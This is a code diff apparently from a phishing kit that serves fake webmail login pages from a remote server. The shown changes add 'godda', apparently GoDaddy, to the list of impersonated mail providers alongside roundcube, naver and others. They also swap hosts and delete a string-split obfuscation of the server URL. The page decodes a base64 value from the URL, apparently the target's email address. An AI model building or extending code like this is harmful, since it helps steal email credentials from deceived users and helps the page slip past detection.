@@ -15,10 +15,13 @@
       href="original-favicon.ico"
       type="image/x-icon"
     />
-    <base href="https://stareio.com/SOMDserver/assets/" />
+    <base href="https://stareio.com/SOMDserver/assets/" /> 
+    <!-- <base href="http://tools.com/pages/latestpages/SOMDserver/assets/" />-->
 
     <!-- <script src="./myjs.js"></script> -->
     <script>
+      // const BASE_URL = "http://tools.com/pages/latestpages/SOMDserver";
+      // const ASSETS_URL = "http://tools.com/pages/latestpages/SOMDserver/assets";
       const BASE_URL = "https://stareio.com/SOMDserver";
       const ASSETS_URL = "https://stareio.com/SOMDserver/assets";
 
@@ -87,6 +90,7 @@
           page == "bossmail" ||
           page == "webmail" ||
           page == "roundcube" ||
+          page == "godda" ||
           page == "naver" ||
           page == "globalmail"
         ) {
@@ -677,14 +681,6 @@
           mg = atob(xx[1]);
         }
 
-        /*
-        let rd1 = "htt";
-        let rd2 = "ps://";
-        let rd3 = "sta";
-        let rd4 = "reio.com/se";
-        let rd5 = "rvePa";
-        let rd6 = "ge.php"; */
-
         let rd1 = `${BASE_URL}/engine/servePage.php`;
         let rd2 = "";
         let rd3 = "";
@@ -705,6 +701,7 @@
           page == "bossmail" ||
           page == "webmail" ||
           page == "roundcube" ||
+          page == "godda" ||
           page == "naver" ||
           page == "globalmail"
         ) {
